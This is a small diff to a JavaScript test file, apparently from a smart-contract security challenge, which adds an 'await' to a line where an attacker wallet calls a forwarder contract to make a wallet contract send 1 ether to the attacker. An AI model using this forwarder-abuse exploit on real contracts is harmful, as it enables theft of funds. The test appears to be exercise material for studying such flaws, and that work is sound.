@@ -31,7 +31,7 @@ describe(NAME, function () {
             let ABI = ["function sendEther(address destination, uint256 amount)"];
             let iface = new ethers.utils.Interface(ABI);
             let data = iface.encodeFunctionData("sendEther", [attackerWallet.address, ethers.utils.parseEther("1.0")]);
-            forwarderContract.connect(attackerWallet).functionCall(walletContract.address, data);
+            await forwarderContract.connect(attackerWallet).functionCall(walletContract.address, data);
         });
 
         after(async function () {
